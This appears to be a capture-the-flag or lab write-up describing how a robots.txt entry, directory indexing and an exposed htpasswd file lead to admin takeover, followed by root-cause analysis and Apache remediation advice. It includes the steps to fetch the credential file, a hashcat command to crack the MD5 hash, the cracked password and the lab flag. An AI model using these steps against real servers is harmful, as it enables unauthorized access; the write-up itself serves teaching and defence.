# Exposed htpasswd File Leaking Admin Credentials

## Summary

This breach chains two misconfigurations: a `robots.txt` file that advertises a sensitive directory, and a publicly accessible `htpasswd` file left inside that directory. The `htpasswd` file contains a username and an unsalted MD5 password hash. The hash is trivially cracked using an online lookup, yielding plaintext credentials that grant access to the `/admin/` panel.

---

## Category

**Sensitive Data Exposure / Security Misconfiguration**
OWASP: [A02:2021 – Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) /
[A05:2021 – Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)

---

## Steps to Reproduce

### 1. Read robots.txt

```
http://10.11.10.2:80/robots.txt
```

The file discloses a path that should not be public:

```
Disallow: /whatever
```

As with the hidden directory breach, `robots.txt` is itself public — listing a path here advertises it to any attacker who looks.

### 2. Browse the disclosed directory

Navigate to:

```
http://10.11.10.2:80/whatever/
```

Directory indexing is enabled. The listing contains a file named `htpasswd`.

### 3. Retrieve the htpasswd file

```
http://10.11.10.2:80/whatever/htpasswd
```

Contents:

```
root:437394baff5aa33daa618be47b75cb49
```

This is an Apache `htpasswd` file. The format is `username:hash`. The hash `437394baff5aa33daa618be47b75cb49` is a 32-character MD5 digest.

### 4. Crack the hash

Paste the hash into an MD5 reverse-lookup tool (e.g. [crackstation.net](https://crackstation.net)) or crack it locally:

```bash
echo "437394baff5aa33daa618be47b75cb49" | hashcat -m 0 -a 0 - /usr/share/wordlists/rockyou.txt
```

Result:

```
437394baff5aa33daa618be47b75cb49 → qwerty123@
```

### 5. Log in to the admin panel

Navigate to:

```
http://10.11.10.2:80/admin/
```

Enter the recovered credentials:

```
Username: root
Password: qwerty123@
```

Access is granted and the flag is returned:

```
d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
```

---

## Why This Works

This breach is a chain of three independent failures, each of which compounds the next:

```
robots.txt discloses /whatever/
        ↓
Directory indexing exposes htpasswd
        ↓
MD5 hash is cracked in seconds
        ↓
Admin panel is compromised
```

Any one of these failures fixed in isolation would have broken the chain. Together they result in a full admin takeover with no brute force required.

---

## Root Cause

| Problem | Detail |
|---|---|
| Credential file served over HTTP | `htpasswd` is a server-side config file — it must never be inside the web root |
| Directory indexing enabled | Allows enumeration of all files in `/whatever/` |
| `robots.txt` discloses the path | Turns a hidden directory into a signposted one |
| MD5 used for password hashing | MD5 is not a password hashing algorithm — it is a message digest with no cost factor, making it trivially brute-forceable |
| Weak password | `qwerty123@` appears in all common wordlists |

---

## Remediation

### 1. Never store credential files inside the web root

`htpasswd` files (and any other credential or config files) must live outside the directories served by the web server:

```apache
# Bad — file is publicly accessible
/var/www/html/whatever/htpasswd

# Good — file is outside the web root entirely
/etc/apache2/.htpasswd
```

Reference it from your Apache config:

```apache
<Directory /var/www/html/admin>
    AuthType Basic
    AuthName "Admin"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
</Directory>
```

### 2. Use a proper password hashing algorithm

The `htpasswd` utility supports bcrypt (`-B` flag), which is the correct choice:

```bash
# Create a new htpasswd file using bcrypt
htpasswd -cB /etc/apache2/.htpasswd root
```

Never use MD5 (`-m`) or plain MD5 APR (`$apr1$`) for new deployments. Bcrypt adds a cost factor that makes brute-force attacks orders of magnitude slower.

### 3. Disable directory indexing

```apache
<Directory /var/www/html>
    Options -Indexes
</Directory>
```

### 4. Do not list sensitive paths in robots.txt

See the Hidden Directory Enumeration breach — any path in `robots.txt` is public knowledge.

### 5. Enforce strong passwords

Even with a strong hash, a password like `qwerty123@` will appear in wordlists. Enforce a minimum complexity policy and consider using a password manager to generate credentials for admin accounts.

---

## References

- [OWASP: Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)
- [OWASP: Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [Apache: Authentication and Authorization](https://httpd.apache.org/docs/2.4/howto/auth.html)
- [CWE-256: Plaintext Storage of a Password](https://cwe.mitre.org/data/definitions/256.html)
- [CWE-916: Use of Password Hash with Insufficient Computational Effort](https://cwe.mitre.org/data/definitions/916.html)
- [CWE-548: Exposure of Information Through Directory Listing](https://cwe.mitre.org/data/definitions/548.html)
